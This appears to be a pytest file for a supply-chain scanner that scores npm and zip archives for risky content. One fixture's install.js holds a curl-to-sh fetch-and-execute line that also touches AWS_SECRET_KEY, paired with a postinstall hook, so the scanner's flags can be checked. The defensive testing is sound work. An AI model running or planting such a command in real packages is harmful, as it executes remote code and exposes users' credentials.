from __future__ import annotations

import io
import json
import tarfile
import zipfile

from mw.ingest.tarball import scan_archive


def _tar(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return buffer.getvalue()


def test_scan_archive_flags_suspicious_content():
    data = _tar({
        "package/package.json": json.dumps({
            "scripts": {"postinstall": "node install.js"}
        }).encode(),
        "package/install.js": b"curl https://example.org/x | sh; process.env.AWS_SECRET_KEY",
    })
    result = scan_archive(data, "pkg.tgz")
    assert result["risk_score"] >= 40
    assert "network_exec" in result["flags"]
    assert "env_access" in result["flags"]
    assert "install_hook" in result["flags"]
    assert result["files"] >= 2


def test_scan_archive_benign_content():
    result = scan_archive(_tar({"pkg/README.md": b"# hello"}), "pkg.tgz")
    assert result["risk_score"] == 0
    assert result["files"] == 1


def test_scan_archive_zip_and_invalid():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("pkg/setup.py", "import subprocess\nsubprocess.run(['echo'])\n")
    result = scan_archive(buffer.getvalue(), "pkg.zip")
    assert "child_process" in result["flags"]

    invalid = scan_archive(b"not an archive", "x.bin")
    assert "unrecognised_archive" in invalid["flags"]


def test_scan_content_pipeline(tmp_path, monkeypatch):
    from mw import db, pipeline
    from mw.config import load_config
    from mw.models import Package, Version

    cfg = load_config()
    cfg.db_path = tmp_path / "content.sqlite"
    cfg.data_dir = tmp_path
    conn = db.connect(cfg.db_path)
    db.init_db(conn)
    db.upsert_packages(conn, [Package(system="npm", name="pkg")])
    db.upsert_versions(conn, [Version(
        system="npm", name="pkg", version="1.0.0",
        published_at="2024-01-01T00:00:00+00:00",
    )])
    db.record_score(conn, "npm", "pkg", 60.0, "high", cfg.model_version, "hash", "2026-01-01")
    conn.commit()
    conn.close()

    class Client:
        def __enter__(self):
            return self
        def __exit__(self, *args):
            return False

    monkeypatch.setattr(pipeline, "make_client", lambda cfg: Client())
    monkeypatch.setattr(
        pipeline.tarball, "fetch_archive",
        lambda client, system, name, version, max_bytes: (b"not an archive", "pkg.tgz"),
    )
    result = pipeline.scan_content(cfg, limit=1)
    assert result == {"requested": 1, "scanned": 1, "errors": 0, "dry_run": False}

    check = db.connect(cfg.db_path)
    assert db.get_content_scan(check, "npm", "pkg")["flags_json"]
    check.close()
